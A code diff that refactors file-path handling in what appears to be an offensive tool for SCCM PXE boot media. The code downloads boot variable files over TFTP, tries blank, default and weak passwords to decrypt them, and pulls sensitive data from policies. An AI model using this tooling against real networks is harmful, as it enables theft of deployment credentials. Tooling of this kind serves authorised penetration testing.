@@ -1467,18 +1467,25 @@ def get_pxe_files(ip):
         encrypted_key = answer_array[2]
         write_to_file(WORKING_DIR, "encrypted_key", encrypted_key, "binary")
 
+    variables_file_location = os.path.join(WORKING_DIR, variables_filename)
+    bcd_file_location = os.path.join(WORKING_DIR, bcd_filename)
+    
+    # Verify if the working directory exists
+    if not os.path.exists(WORKING_DIR):
+        os.makedirs(WORKING_DIR)
+
     tftp_client = tftpy.TftpClient(tftp_server_ip, 69)
-    tftp_client.download(variables_file, WORKING_DIR + variables_filename)
-    tftp_client.download(bcd_file, WORKING_DIR + bcd_filename)
+    tftp_client.download(variables_file, variables_file_location)
+    tftp_client.download(bcd_file, bcd_file_location)
 
     if BLANK_PASSWORDS_FOUND:
         # If a Blank Password is found for the media
         print_nice("Attempting automatic exploitation.", "INFO")
-        decrypted_media_variables = decrypt_pxe_media_from_encrypted_key(encrypted_key, WORKING_DIR + variables_filename)
+        decrypted_media_variables = decrypt_pxe_media_from_encrypted_key(encrypted_key, variables_file_location)
     else:
         # If a defined password is used for the media
         print_nice("User configured password detected for task sequence media.", "INFO")
-        response, decrypted_media_variables, resolved_password = test_default_weak_passwords_on_media(WORKING_DIR + variables_filename)
+        response, decrypted_media_variables, resolved_password = test_default_weak_passwords_on_media(variables_file_location)
 
     if decrypted_media_variables is not None:
         #print_nice("Successfully decrypted media variables file using default/weak password!", "SUCCESS")
@@ -1490,7 +1497,7 @@ def get_pxe_files(ip):
         print_nice("Failed to decrypt media variable file", "ERROR")
 
     return True
-
+    
 def download_and_decrypt_policies_using_certificate(guid, cert_bytes):
     #Parse the downloaded task sequences and extract sensitive data if present
     smsMediaGuid = guid
